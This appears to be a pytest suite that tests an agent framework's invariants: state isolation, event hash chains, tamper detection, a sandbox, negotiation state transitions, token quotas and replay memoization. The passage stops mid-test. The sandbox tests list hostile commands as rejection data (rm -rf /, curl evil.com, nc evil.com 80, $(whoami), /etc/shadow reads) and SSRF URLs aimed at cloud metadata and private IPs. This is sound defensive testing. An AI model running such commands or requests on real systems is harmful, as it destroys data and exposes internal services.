"""Empirical challenge suite for Milestone 4 Financial Workflow Invariants.

Challenging all 7 invariant boundaries defined in examples/financial_audit_workflow.py:
1. Invariant 1 (State Separation):
   - Physical state isolation enforcement.
   - Injection of repo root, subdirectories, relative traversals, symlink escapes, and env vars.
   - Zero state files or databases permitted inside repository.
2. Invariant 2 (Cryptographic Hash Chain):
   - Full event continuity verification.
   - Genesis hash tampering, sequence number skips, non-monotonic nanosecond timestamps,
     tail truncation, and workflow ID mismatch detection.
3. Invariant 3 (Anti-Tamper Payload Corruption):
   - Adversarial corruption of event payload data (strings, floats, dict keys, nulls).
   - Corruption of event metadata (event_id, event_type, node_id, prev_hash, state_hash).
   - Event deletion, event insertion, and event swapping in the chain.
   - Assert CryptographicIntegrityError is raised immediately in 100% of cases.
4. Invariant 4 (Sandbox Tri-Vector Defense):
   - Vector 1: Filesystem path traversal, mode 'x' containment, prefix bleed, sibling dirs.
   - Vector 2: Command injection chaining (;, &&, ||, |, $(), ``, <, >), path spoofing, unlisted commands.
   - Vector 3: SSRF defense against cloud metadata (169.254.169.254, 168.63.129.16), loopback (127.0.0.1, [::1]),
     private networks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, CGNAT), IPv6 mapped/compatible,
     disallowed schemes (http, ftp, file, gopher), and unauthorized domains.
   - Assert PermissionDeniedError is raised in 100% of attack attempts.
5. Invariant 5 (A2A Negotiation State Transitions):
   - Exhaustive state transition testing across FIPA ACL lifecycle.
   - Illegal performatives from INIT, REQUESTED, PROPOSED, AGREED, EXECUTING, INFORMED, REFUSED, FAILED.
   - Out-of-order mark_executing() calls.
   - Session timeout expiration enforcement.
   - Assert InvalidStateTransitionError is raised on all illegal transitions.
6. Invariant 6 (Telemetry Token Accounting & W3C Tracing):
   - Strict token budget cutoff at exact boundary (limit vs limit + 1).
   - Zero quota leakage verification upon QuotaExceededError.
   - Negative token rejection.
   - W3C traceparent formatting and adversarial corruption rejection.
7. Invariant 7 (ActivityMemoizer Replay Deduplication):
   - Replay execution deduplication: zero physical re-execution, 0ms latency, zero duplicate tokens.
   - Idempotency key conflict enforcement (IdempotencyConflictError on mismatched arguments).
   - Re-execution of financial audit workflow graph nodes.
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
import uuid
from pathlib import Path
from typing import Any

import pytest

from agentmesh.engine.activity import execute_activity
from agentmesh.engine.checkpoint import CheckpointManager, StateSeparationError
from agentmesh.engine.graph import Graph
from agentmesh.engine.memoizer import ActivityMemoizer, IdempotencyConflictError
from agentmesh.engine.replay import EventReplayer
from agentmesh.engine.state import (
    CryptographicIntegrityError,
    Event,
    EventType,
    State,
)
from agentmesh.mesh.a2a import (
    A2AMessage,
    InvalidStateTransitionError,
    NegotiationManager,
    NegotiationSession,
    NegotiationState,
    Performative,
)
from agentmesh.security.policy import CapabilityPolicy
from agentmesh.security.sandbox import PermissionDeniedError, SecuritySandbox
from agentmesh.telemetry.tracer import AgentTracer, QuotaExceededError, TokenTracker
from agentmesh.telemetry.w3c import TraceContextValidationError, validate_traceparent

# ==============================================================================
# Challenge 1: Invariant 1 - State Separation Violation Injection
# ==============================================================================


class TestInvariant1StateSeparation:
    """Empirical challenge against physical state isolation and repo leakage prevention."""

    @pytest.fixture
    def repo_root(self) -> Path:
        root = CheckpointManager._detect_repo_root()
        assert root is not None, "Repository root must be detectable."
        return root

    def test_repo_root_direct_injection_rejected(self, repo_root: Path):
        """Attempting to use repository root directly as state directory must raise StateSeparationError."""
        with pytest.raises(StateSeparationError) as exc_info:
            CheckpointManager.validate_state_dir(repo_root)
        assert "Physical State Separation Violation" in str(exc_info.value)
        assert str(repo_root) in str(exc_info.value)

    @pytest.mark.parametrize(
        "subpath",
        [
            "checkpoints",
            "data/checkpoints",
            "state_storage",
            "agentmesh/engine/state_leak",
            ".state_test",
        ],
    )
    def test_repo_subdirectories_injection_rejected(self, repo_root: Path, subpath: str):
        """Any subfolder inside repository root must be rejected with StateSeparationError."""
        illegal_path = repo_root / subpath
        with pytest.raises(StateSeparationError) as exc_info:
            CheckpointManager.validate_state_dir(illegal_path)
        assert "Physical State Separation Violation" in str(exc_info.value)

    @pytest.mark.parametrize(
        "rel_path",
        [
            ".",
            "./checkpoints",
            "../OSCHINA",
            "agentmesh",
        ],
    )
    def test_relative_paths_resolving_in_repo_rejected(self, rel_path: str):
        """Relative paths resolving inside repository root must be rejected."""
        with pytest.raises(StateSeparationError):
            CheckpointManager.validate_state_dir(rel_path)

    def test_symlink_pointing_into_repo_rejected(self, repo_root: Path, tmp_path: Path):
        """A symlink located outside repo pointing inside repo must be rejected."""
        symlink_path = tmp_path / "symlink_to_repo"
        target_in_repo = repo_root / "checkpoints_target"
        try:
            symlink_path.symlink_to(target_in_repo)
            with pytest.raises(StateSeparationError):
                CheckpointManager.validate_state_dir(symlink_path)
        finally:
            if symlink_path.is_symlink():
                symlink_path.unlink()

    def test_env_var_injection_rejected(self, repo_root: Path, monkeypatch: pytest.MonkeyPatch):
        """AGENTMESH_STATE_DIR set to in-repo path must be rejected on instantiation."""
        illegal_dir = str(repo_root / "env_checkpoints")
        monkeypatch.setenv("AGENTMESH_STATE_DIR", illegal_dir)

        with pytest.raises(StateSeparationError):
            CheckpointManager()

        with pytest.raises(StateSeparationError):
            ActivityMemoizer()

    def test_valid_isolated_path_accepted(self, tmp_path: Path):
        """A dedicated directory outside repo tree succeeds without error."""
        valid_dir = tmp_path / "valid_agentmesh_state"
        resolved = CheckpointManager.validate_state_dir(valid_dir)
        assert resolved.exists() or resolved == valid_dir.resolve()

    def test_financial_audit_repo_cleanliness(self):
        """Executing financial_audit_workflow.py must leave zero .db or state files in repo."""
        result = subprocess.run(
            [sys.executable, "examples/financial_audit_workflow.py"],
            capture_output=True,
            text=True,
            env={**os.environ, "PYTHONPATH": "."},
        )
        assert result.returncode == 0, f"Workflow failed: {result.stderr}"

        # Git status check to ensure zero untracked databases or state files
        git_status = subprocess.run(
            ["git", "status", "--porcelain"],
            capture_output=True,
            text=True,
        )
        assert git_status.returncode == 0
        untracked = [line for line in git_status.stdout.splitlines() if line.startswith("??")]
        illegal_files = [
            f for f in untracked if any(f.endswith(ext) for ext in [".db", ".sqlite", ".sqlite3", ".wal", ".shm"])
        ]
        assert len(illegal_files) == 0, f"Found illegal state artifacts in repo: {illegal_files}"


# ==============================================================================
# Challenge 2: Invariant 2 - Event Hash Chain Verification
# ==============================================================================


class TestInvariant2HashChainVerification:
    """Empirical challenge against SHA-256 cryptographic event hash chain continuity."""

    @pytest.fixture
    def valid_workflow_events(self) -> list[Event]:
        """Generates a valid chain of events across a synthetic financial workflow."""
        st = State(workflow_id="wf-test-chain-001")
        st.append_event(EventType.WORKFLOW_START, node_id="entry", payload={"account": "ACC-01"})
        st.append_event(EventType.NODE_START, node_id="fetch_records", payload={})
        st.append_event(
            EventType.ACTIVITY_STARTED,
            node_id="fetch_records",
            payload={"activity": "query_ledger", "account_id": "ACC-01"},
        )
        st.append_event(
            EventType.ACTIVITY_COMPLETED,
            node_id="fetch_records",
            payload={"record_count": 3, "total_cny": 1845000.0},
        )
        st.append_event(EventType.NODE_COMPLETE, node_id="fetch_records", payload={"status": "SUCCESS"})
        st.append_event(EventType.WORKFLOW_COMPLETE, node_id="entry", payload={"verdict": "FLAGGED"})
        return st.events

    def test_valid_chain_verifies_cleanly(self, valid_workflow_events: list[Event]):
        """A pristine event sequence must pass verification with no errors."""
        is_valid, err = EventReplayer.verify_event_chain(valid_workflow_events)
        assert is_valid is True
        assert err is None

    def test_genesis_hash_tampering_detected(self, valid_workflow_events: list[Event]):
        """Genesis event prev_hash corrupted to non-zero must be blocked."""
        events = [e.model_copy(deep=True) for e in valid_workflow_events]
        events[0].prev_hash = "1" * 64
        is_valid, err = EventReplayer.verify_event_chain(events)
        assert is_valid is False
        assert err is not None
        assert "Genesis predecessor hash mismatch" in err

    def test_sequence_number_skip_detected(self, valid_workflow_events: list[Event]):
        """Skipping a sequence number (e.g. 1 -> 3) must be detected immediately."""
        events = [e.model_copy(deep=True) for e in valid_workflow_events]
        events[1].sequence_num = 3
        is_valid, err = EventReplayer.verify_event_chain(events)
        assert is_valid is False
        assert err is not None
        assert "Event sequence break" in err

    def test_predecessor_hash_link_break_detected(self, valid_workflow_events: list[Event]):
        """Corrupting prev_hash at an intermediate node must break continuity check."""
        events = [e.model_copy(deep=True) for e in valid_workflow_events]
        events[2].prev_hash = "deadbeef" * 8
        is_valid, err = EventReplayer.verify_event_chain(events)
        assert is_valid is False
        assert err is not None
        assert "Predecessor hash break" in err

    def test_timestamp_regression_detected(self, valid_workflow_events: list[Event]):
        """An event with timestamp earlier than its predecessor must be rejected as an anomaly."""
        events = [e.model_copy(deep=True) for e in valid_workflow_events]
        events[3].timestamp_ns = events[2].timestamp_ns - 500000
        # Recompute hash for event 3 so only the timestamp regression is tested
        events[3].state_hash = events[3].calculate_hash(events[3].prev_hash)
        is_valid, err = EventReplayer.verify_event_chain(events)
        assert is_valid is False
        assert err is not None
        assert "Timestamp regression anomaly" in err

    def test_tail_truncation_detected(self, valid_workflow_events: list[Event]):
        """Supplying an expected_last_hash that differs from events[-1] must fail."""
        expected_hash = "f" * 64
        is_valid, err = EventReplayer.verify_event_chain(
            valid_workflow_events, expected_last_hash=expected_hash
        )
        assert is_valid is False
        assert err is not None
        assert "Tail truncation" in err

    def test_workflow_identity_mismatch_detected(self, valid_workflow_events: list[Event]):
        """An event from a different workflow injected into the chain must be caught."""
        events = [e.model_copy(deep=True) for e in valid_workflow_events]
        events[2].workflow_id = "wf-malicious-injected-002"
        is_valid, err = EventReplayer.verify_event_chain(
            events, expected_workflow_id="wf-test-chain-001"
        )
        assert is_valid is False
        assert err is not None
        assert "Workflow identity mismatch" in err


# ==============================================================================
# Challenge 3: Invariant 3 - Anti-Tamper Payload Corruption
# ==============================================================================


class TestInvariant3AntiTamperCorruption:
    """Empirical challenge asserting immediate CryptographicIntegrityError upon data corruption."""

    @pytest.fixture
    def audit_state(self) -> State:
        st = State(workflow_id="wf-tamper-audit-001")
        st.append_event(
            EventType.ACTIVITY_COMPLETED,
            node_id="fetch_records",
            payload={
                "tx_id": "TX-2026-002",
                "amount": 1800000.0,
                "currency": "CNY",
                "counterparty": "Offshore_Entity_BVI",
                "flag": "SUSPICIOUS",
            },
        )
        st.append_event(
            EventType.ACTIVITY_COMPLETED,
            node_id="compliance_assessment",
            payload={
                "risk_level": "CRITICAL",
                "suspicious_count": 1,
                "regulatory_action": "REPORT_TO_REGULATOR",
            },
        )
        return st

    @pytest.mark.parametrize(
        "payload_patch",
        [
            {"amount": 10.0},  # Value reduction
            {"flag": "CLEAN"},  # Flag clearing
            {"risk_level": "LOW"},  # Severity downgrade
            {"counterparty": "Local_Vendor"},  # Counterparty spoofing
            {"new_injected_key": "unauthorized"},  # Extra key injection
        ],
    )
    def test_payload_value_mutation_triggers_integrity_error(
        self, audit_state: State, payload_patch: dict[str, Any]
    ):
        """Mutating any value in the payload must trigger CryptographicIntegrityError."""
        tampered_state = State(
            workflow_id=audit_state.workflow_id,
            run_id=audit_state.run_id,
            version=audit_state.version,
            data=audit_state.data.copy(),
            events=[e.model_copy(deep=True) for e in audit_state.events],
            last_hash=audit_state.last_hash,
        )
        tampered_state.events[0].payload.update(payload_patch)

        with pytest.raises(CryptographicIntegrityError) as exc_info:
            EventReplayer.enforce_integrity(tampered_state)
        assert "Cryptographic hash mismatch" in str(exc_info.value) or "Event hash mismatch" in str(
            exc_info.value
        )

    def test_metadata_corruption_triggers_integrity_error(self, audit_state: State):
        """Mutating event metadata (node_id, event_type, event_id) must be blocked."""
        # 1. Mutate node_id
        st1 = State(
            workflow_id=audit_state.workflow_id,
            events=[e.model_copy(deep=True) for e in audit_state.events],
            last_hash=audit_state.last_hash,
        )
        st1.events[0].node_id = "spoofed_node"
        with pytest.raises(CryptographicIntegrityError):
            EventReplayer.enforce_integrity(st1)

        # 2. Mutate event_type
        st2 = State(
            workflow_id=audit_state.workflow_id,
            events=[e.model_copy(deep=True) for e in audit_state.events],
            last_hash=audit_state.last_hash,
        )
        st2.events[0].event_type = EventType.ACTIVITY_STARTED
        with pytest.raises(CryptographicIntegrityError):
            EventReplayer.enforce_integrity(st2)

    def test_event_swapping_in_chain_blocked(self, audit_state: State):
        """Swapping two adjacent events must cause immediate CryptographicIntegrityError."""
        st = State(
            workflow_id=audit_state.workflow_id,
            events=[audit_state.events[1].model_copy(deep=True), audit_state.events[0].model_copy(deep=True)],
            last_hash=audit_state.last_hash,
        )
        with pytest.raises(CryptographicIntegrityError):
            EventReplayer.enforce_integrity(st)

    def test_event_deletion_blocked(self, audit_state: State):
        """Deleting an event in the middle breaks continuity and raises CryptographicIntegrityError."""
        # Add third event
        audit_state.append_event(EventType.WORKFLOW_COMPLETE, node_id="finish", payload={})
        st = State(
            workflow_id=audit_state.workflow_id,
            events=[audit_state.events[0].model_copy(deep=True), audit_state.events[2].model_copy(deep=True)],
            last_hash=audit_state.last_hash,
        )
        with pytest.raises(CryptographicIntegrityError):
            EventReplayer.enforce_integrity(st)


# ==============================================================================
# Challenge 4: Invariant 4 - Sandbox Tri-Vector Defense
# ==============================================================================


class TestInvariant4SandboxTriVectorDefense:
    """Empirical challenge against capability security sandbox across paths, commands, and SSRF."""

    @pytest.fixture
    def sandbox(self, tmp_path: Path) -> SecuritySandbox:
        allowed_dir = str(tmp_path / "sandbox_allowed")
        os.makedirs(allowed_dir, exist_ok=True)
        policy = CapabilityPolicy(
            policy_name="test_financial_compliance_sandbox",
            allowed_read_paths=[allowed_dir],
            allowed_write_paths=[allowed_dir],
            allowed_commands={"echo", "sha256sum", "cat"},
            allow_network=True,
            allowed_domains=["api.swift-compliance.com", "fx.centralbank.org"],
            allowed_schemes={"https"},
            block_loopback=True,
            block_cloud_metadata=True,
            block_private_ips=True,
        )
        return SecuritySandbox(policy=policy)

    # --------------------------------------------------------------------------
    # Vector 1: Filesystem Access & Mode Violations
    # --------------------------------------------------------------------------

    @pytest.mark.parametrize(
        "illegal_path",
        [
            "/etc/passwd",
            "/private/etc/shadow",
            "../../etc/passwd",
            "./../etc/hosts",
            "/tmp",
        ],
    )
    def test_filesystem_path_traversal_blocked(self, sandbox: SecuritySandbox, illegal_path: str):
        """Arbitrary files outside sandbox boundary must be blocked with PermissionDeniedError."""
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_file_access(illegal_path, mode="r")

        with pytest.raises(PermissionDeniedError):
            sandbox.validate_file_access(illegal_path, mode="w")

    def test_filesystem_mode_x_blocked_without_exec_policy(self, sandbox: SecuritySandbox):
        """Mode 'x' (execute) must be blocked if allowed_execute_paths is unconfigured."""
        allowed_file = f"{sandbox.policy.allowed_write_paths[0]}/script.sh"
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_file_access(allowed_file, mode="x")

    def test_filesystem_sibling_prefix_collision_blocked(self, sandbox: SecuritySandbox):
        """Sibling path with common prefix (e.g. allowed_dir_fake) must be blocked."""
        collision_path = f"{sandbox.policy.allowed_write_paths[0]}_collision/secret.txt"
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_file_access(collision_path, mode="w")

    # --------------------------------------------------------------------------
    # Vector 2: Command Injection & Metacharacter Chaining
    # --------------------------------------------------------------------------

    @pytest.mark.parametrize(
        "injected_cmd",
        [
            "cat file.json; rm -rf /",
            "cat file.json && curl evil.com",
            "cat file.json || rm -rf /",
            "cat file.json | nc evil.com 80",
            "echo $(whoami)",
            "echo `id`",
            "cat file.json > /etc/passwd",
            "cat file.json >> /tmp/pwned",
            "cat < /etc/shadow",
            "cat file.json\nrm -rf /",
        ],
    )
    def test_command_injection_metacharacters_blocked(
        self, sandbox: SecuritySandbox, injected_cmd: str
    ):
        """Shell metacharacters and chaining attempts must be blocked with PermissionDeniedError."""
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_command(injected_cmd)

    @pytest.mark.parametrize(
        "unauthorized_cmd",
        [
            "rm -rf /tmp",
            "curl https://fx.centralbank.org",
            "wget https://evil.com",
            "sudo cat /etc/shadow",
            "python3 -c 'import os'",
            "/bin/echo hello",  # Absolute path when only bare command is in whitelist
            "../../bin/echo hello",
        ],
    )
    def test_unauthorized_command_execution_blocked(
        self, sandbox: SecuritySandbox, unauthorized_cmd: str
    ):
        """Commands not explicitly whitelisted must be blocked with PermissionDeniedError."""
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_command(unauthorized_cmd)

    # --------------------------------------------------------------------------
    # Vector 3: Network SSRF & Disallowed Targets
    # --------------------------------------------------------------------------

    @pytest.mark.parametrize(
        "ssrf_target",
        [
            # Cloud Metadata IPv4
            "https://169.254.169.254/latest/meta-data/",
            "https://169.254.1.1",
            "https://168.63.129.16",  # Azure Wire Server
            # Loopback IPv4
            "https://127.0.0.1:8080/admin",
            "https://127.0.0.2/status",
            "https://0.0.0.0:80",
            # RFC 1918 Private IPv4
            "https://10.0.0.1/core-banking",
            "https://172.16.0.1/secret",
            "https://192.168.1.1/gateway",
            # Carrier-Grade NAT (RFC 6598)
            "https://100.64.0.1/metadata",
            # IPv6 Loopback and Mapped/Compatible
            "https://[::1]/debug",
            "https://[::ffff:169.254.169.254]/latest",
            "https://[::ffff:127.0.0.1]:8080",
            "https://[64:ff9b::169.254.169.254]",  # NAT64 translation
            # Disallowed Schemes
            "http://api.swift-compliance.com/v1",  # HTTP rejected when only HTTPS allowed
            "file:///etc/passwd",
            "ftp://fx.centralbank.org/rates",
            "gopher://127.0.0.1:6379",
            # Unauthorized Domains
            "https://unauthorized-attacker-site.com/leak",
            "https://api.swift-compliance.com.evil.com/fake",
            "https://evil-fx.centralbank.org",
        ],
    )
    def test_ssrf_and_domain_whitelist_violations_blocked(
        self, sandbox: SecuritySandbox, ssrf_target: str
    ):
        """All SSRF, protocol scheme, and domain whitelist violations must raise PermissionDeniedError."""
        with pytest.raises(PermissionDeniedError):
            sandbox.validate_network(ssrf_target)

    def test_authorized_operations_succeed(self, sandbox: SecuritySandbox):
        """Authorized operations must pass validation without error."""
        allowed_file = f"{sandbox.policy.allowed_write_paths[0]}/audit_report.json"
        safe_path = sandbox.validate_file_access(allowed_file, mode="w")
        assert str(safe_path) == allowed_file

        cmd_vec = sandbox.validate_command(["sha256sum", allowed_file])
        assert cmd_vec == ["sha256sum", allowed_file]

        safe_url = sandbox.validate_network("https://fx.centralbank.org/rates")
        assert safe_url == "https://fx.centralbank.org/rates"


# ==============================================================================
# Challenge 5: Invariant 5 - A2A Negotiation State Transitions
# ==============================================================================


class TestInvariant5A2ANegotiationStateTransitions:
    """Empirical challenge against FIPA ACL state machine transitions in A2A negotiations."""

    @pytest.fixture
    def manager(self) -> NegotiationManager:
        return NegotiationManager()

    def test_legal_negotiation_lifecycle_succeeds(self, manager: NegotiationManager):
        """Standard FIPA ACL lifecycle: REQUEST -> PROPOSE -> AGREE -> EXECUTING -> INFORM."""
        conv_id = f"conv-test-{uuid.uuid4().hex[:8]}"

        # 1. REQUEST
        msg_req = A2AMessage(
            sender_id="auditor_lead",
            recipient_id="compliance_officer",
            performative=Performative.REQUEST,
            payload={"action": "review"},
            conversation_id=conv_id,
        )
        session = manager.process_message(msg_req)
        assert session.current_state == NegotiationState.REQUESTED

        # 2. PROPOSE
        msg_prop = msg_req.create_reply(
            performative=Performative.PROPOSE,
            payload={"fee": 50},
        )
        manager.process_message(msg_prop)
        assert session.current_state == NegotiationState.PROPOSED

        # 3. AGREE
        msg_agree = msg_prop.create_reply(
            performative=Performative.AGREE,
            payload={"accept": True},
        )
        manager.process_message(msg_agree)
        assert session.current_state == NegotiationState.AGREED

        # 4. Mark executing
        session.mark_executing()
        assert session.current_state == NegotiationState.EXECUTING

        # 5. INFORM
        msg_inform = msg_agree.create_reply(
            performative=Performative.INFORM,
            payload={"verdict": "APPROVED"},
        )
        manager.process_message(msg_inform)
        assert session.current_state == NegotiationState.INFORMED
        assert session.is_terminal() is True

    @pytest.mark.parametrize(
        "illegal_performative",
        [
            Performative.PROPOSE,
            Performative.AGREE,
            Performative.INFORM,
            Performative.REFUSE,
            Performative.FAILURE,
        ],
    )
    def test_illegal_performatives_in_init_state_blocked(
        self, manager: NegotiationManager, illegal_performative: Performative
    ):
        """In INIT state, only REQUEST is permitted. Any other performative must raise InvalidStateTransitionError."""
        conv_id = f"conv-{uuid.uuid4().hex[:6]}"
        manager.create_session(
            requester_id="agent_a",
            provider_id="agent_b",
            conversation_id=conv_id,
        )
        msg = A2AMessage(
            sender_id="agent_a",
            recipient_id="agent_b",
            performative=illegal_performative,
            payload={},
            conversation_id=conv_id,
        )
        with pytest.raises(InvalidStateTransitionError):
            manager.process_message(msg)

    def test_illegal_performative_in_requested_state_blocked(self, manager: NegotiationManager):
        """In REQUESTED state, sending INFORM is illegal."""
        conv_id = f"conv-req-{uuid.uuid4().hex[:6]}"
        msg_req = A2AMessage(
            sender_id="agent_a",
            recipient_id="agent_b",
            performative=Performative.REQUEST,
            payload={},
            conversation_id=conv_id,
        )
        manager.process_message(msg_req)

        # Illegal: jump straight to INFORM
        msg_illegal = msg_req.create_reply(performative=Performative.INFORM, payload={})
        with pytest.raises(InvalidStateTransitionError):
            manager.process_message(msg_illegal)

    def test_illegal_performative_in_proposed_state_blocked(self, manager: NegotiationManager):
        """In PROPOSED state, sending INFORM or REQUEST is illegal."""
        conv_id = f"conv-prop-{uuid.uuid4().hex[:6]}"
        msg_req = A2AMessage(
            sender_id="agent_a",
            recipient_id="agent_b",
            performative=Performative.REQUEST,
            payload={},
            conversation_id=conv_id,
        )
        manager.process_message(msg_req)
        msg_prop = msg_req.create_reply(performative=Performative.PROPOSE, payload={})
        manager.process_message(msg_prop)

        # Illegal: INFORM before AGREE
        msg_illegal = msg_prop.create_reply(performative=Performative.INFORM, payload={})
        with pytest.raises(InvalidStateTransitionError):
            manager.process_message(msg_illegal)

    def test_post_terminal_message_rejected(self, manager: NegotiationManager):
        """Sending any message to a terminal session (INFORMED) must raise InvalidStateTransitionError."""
        conv_id = f"conv-term-{uuid.uuid4().hex[:6]}"
        msg_req = A2AMessage(
            sender_id="a", recipient_id="b", performative=Performative.REQUEST, payload={}, conversation_id=conv_id
        )
        manager.process_message(msg_req)
        msg_refuse = msg_req.create_reply(performative=Performative.REFUSE, payload={})
        manager.process_message(msg_refuse)

        # Session is now in REFUSED (terminal)
        msg_after = msg_refuse.create_reply(performative=Performative.REQUEST, payload={})
        with pytest.raises(InvalidStateTransitionError) as exc_info:
            manager.process_message(msg_after)
        assert "terminal state" in str(exc_info.value)

    @pytest.mark.parametrize(
        "invalid_state",
        [
            NegotiationState.INIT,
            NegotiationState.REQUESTED,
            NegotiationState.PROPOSED,
            NegotiationState.INFORMED,
        ],
    )
    def test_mark_executing_from_invalid_state_rejected(self, invalid_state: NegotiationState):
        """mark_executing() must only succeed from AGREED state."""
        session = NegotiationSession(
            conversation_id="conv-exec-test",
            requester_id="a",
            provider_id="b",
        )
        session.current_state = invalid_state
        with pytest.raises(InvalidStateTransitionError):
            session.mark_executing()

    def test_expired_session_fails_gracefully(self, manager: NegotiationManager):
        """A session with elapsed timeout must transition to FAILED and reject new messages."""
        conv_id = f"conv-timeout-{uuid.uuid4().hex[:6]}"
        manager.create_session(
            requester_id="a",
            provider_id="b",
            conversation_id=conv_id,
            timeout_sec=0.001,
        )
        msg_req = A2AMessage(
            sender_id="a", recipient_id="b", performative=Performative.REQUEST, payload={}, conversation_id=conv_id
        )
        manager.process_message(msg_req)

        # Force time elapsed
        time.sleep(0.01)
        msg_reply = msg_req.create_reply(performative=Performative.PROPOSE, payload={})
        with pytest.raises(InvalidStateTransitionError) as exc_info:
            manager.process_message(msg_reply)
        assert "timed out" in str(exc_info.value)


# ==============================================================================
# Challenge 6: Invariant 6 - Telemetry Token Accounting & W3C Tracing
# ==============================================================================


class TestInvariant6TokenQuotaCutoffAndW3CTracing:
    """Empirical challenge asserting token budget cutoff without quota leaks and W3C trace validation."""

    def test_exact_budget_boundary_cutoff(self):
        """Token consumption must allow reaching exact budget limit, but reject limit + 1."""
        tracker = TokenTracker(budget_limit=1000)

        # Consume 600 prompt + 400 completion = 1000 total (exact limit)
        tracker.record(prompt_tokens=600, completion_tokens=400)
        assert tracker.total_tokens == 1000
        assert tracker.prompt_tokens == 600
        assert tracker.completion_tokens == 400

        # Attempting to record 1 additional token must trigger QuotaExceededError
        with pytest.raises(QuotaExceededError) as exc_info:
            tracker.record(prompt_tokens=1, completion_tokens=0)

        assert exc_info.value.budget_limit == 1000
        assert exc_info.value.current_tokens == 1000
        assert exc_info.value.requested_tokens == 1

        # Zero Quota Leakage assertion: total_tokens and prompt_tokens must remain strictly unchanged
        assert tracker.total_tokens == 1000
        assert tracker.prompt_tokens == 600
        assert tracker.completion_tokens == 400

    def test_negative_tokens_rejected(self):
        """Negative token counts must be rejected with ValueError."""
        tracker = TokenTracker(budget_limit=5000)
        with pytest.raises(ValueError):
            tracker.record(prompt_tokens=-10, completion_tokens=50)

        with pytest.raises(ValueError):
            tracker.record(prompt_tokens=50, completion_tokens=-5)

    def test_massive_token_overflow_rejected(self):
        """Massive request beyond budget limit must be rejected without partial allocation."""
        tracker = TokenTracker(budget_limit=500)
        tracker.record(prompt_tokens=100, completion_tokens=50)

        with pytest.raises(QuotaExceededError):
            tracker.record(prompt_tokens=50000, completion_tokens=50000)

        assert tracker.total_tokens == 150

    def test_w3c_traceparent_standards_compliance(self, tmp_path: Path):
        """W3C traceparent must comply strictly with the W3C TraceContext specification."""
        log_file = tmp_path / "telemetry_test.log"
        tracer = AgentTracer(audit_log_file=log_file)
        trace_ctx = tracer.get_or_create_context()
        span = trace_ctx.start_span("compliance_span")

        tp = trace_ctx.to_traceparent(span.span_id)
        # Standard validation
        validate_traceparent(tp)

        parts = tp.split("-")
        assert len(parts) == 4
        assert parts[0] == "00"  # W3C version
        assert len(parts[1]) == 32  # trace_id 32 hex chars
        assert len(parts[2]) == 16  # parent_id 16 hex chars
        assert len(parts[3]) == 2  # trace_flags 2 hex chars

    @pytest.mark.parametrize(
        "invalid_traceparent",
        [
            "ff-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01",  # Explicitly forbidden version ff
            "0g-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01",  # Non-hex version
            "00-00000000000000000000000000000000-00f067aa0ba902b7-01",  # All-zero trace_id
            "00-4bf92f3577b34da6a3ce929d0e0e4736-0000000000000000-01",  # All-zero span_id
            "00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7",  # Missing trace_flags
            "00-xyz92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01",  # Non-hex characters
        ],
    )
    def test_corrupted_traceparents_rejected(self, invalid_traceparent: str):
        """Tampered or invalid traceparent headers must fail validate_traceparent()."""
        with pytest.raises(TraceContextValidationError):
            validate_traceparent(invalid_traceparent)


# ==============================================================================
# Challenge 7: Invariant 7 - ActivityMemoizer Replay Deduplication
# ==============================================================================


class TestInvariant7ActivityMemoizerReplayDeduplication:
    """Empirical challenge asserting 0 duplicate executions and 0 extra tokens on replay."""

    @pytest.fixture
    def isolated_memoizer(self, tmp_path: Path) -> ActivityMemoizer:
        state_dir = tmp_path / "memoizer_storage"
        return ActivityMemoizer(storage_dir=str(state_dir))

    @pytest.mark.asyncio
    async def test_replay_deduplication_zero_reexecution(
        self, isolated_memoizer: ActivityMemoizer
    ):
        """Second call with identical idempotency key must bypass callable and execute in <1ms."""
        from agentmesh.engine.activity import ActivityExecutionContext

        call_counter = 0

        async def expensive_financial_calculation(val: float) -> dict[str, Any]:
            nonlocal call_counter
            call_counter += 1
            return {"calculated": val * 1.05}

        ctx = ActivityExecutionContext(
            workflow_id="wf-memo-001",
            node_id="calc_node",
            memoizer=isolated_memoizer,
        )

        # 1. First invocation: Cache MISS
        res1 = await execute_activity(
            activity_name="calc_activity",
            fn=expensive_financial_calculation,
            args=(100.0,),
            idempotency_key="idemp-calc-100",
            context=ctx,
        )
        assert call_counter == 1
        assert res1["calculated"] == 105.0

        # 2. Second invocation: Cache HIT
        t0 = time.perf_counter()
        res2 = await execute_activity(
            activity_name="calc_activity",
            fn=expensive_financial_calculation,
            args=(100.0,),
            idempotency_key="idemp-calc-100",
            context=ctx,
        )
        t_elapsed_ms = (time.perf_counter() - t0) * 1000.0

        # Assert zero re-execution and sub-millisecond replay
        assert call_counter == 1, "Physical callable was re-executed on cache hit!"
        assert res2["calculated"] == 105.0
        assert t_elapsed_ms < 1.0, f"Replay took {t_elapsed_ms:.3f}ms, expected < 1.0ms"

    @pytest.mark.asyncio
    async def test_idempotency_conflict_detection(self, isolated_memoizer: ActivityMemoizer):
        """Reusing explicit idempotency key with different arguments must raise IdempotencyConflictError."""
        from agentmesh.engine.activity import ActivityExecutionContext

        async def dummy_fn(data: str) -> str:
            return data

        ctx = ActivityExecutionContext(
            workflow_id="wf-memo-002",
            node_id="step_a",
            memoizer=isolated_memoizer,
        )

        # First call with payload "initial_data"
        await execute_activity(
            activity_name="dummy_action",
            fn=dummy_fn,
            args=("initial_data",),
            idempotency_key="idemp-shared-key",
            context=ctx,
        )

        # Second call with conflicting payload "tampered_data"
        with pytest.raises(IdempotencyConflictError) as exc_info:
            await execute_activity(
                activity_name="dummy_action",
                fn=dummy_fn,
                args=("tampered_data",),
                idempotency_key="idemp-shared-key",
                context=ctx,
            )
        assert "Idempotency key conflict" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_financial_workflow_full_replay_deduplication(self, tmp_path: Path):
        """Re-running the financial workflow DAG from final state must produce memoized hits with 0 new tokens."""
        from agentmesh.mesh.router import AgentEndpoint, MeshRouter

        run_uuid = uuid.uuid4().hex[:8]
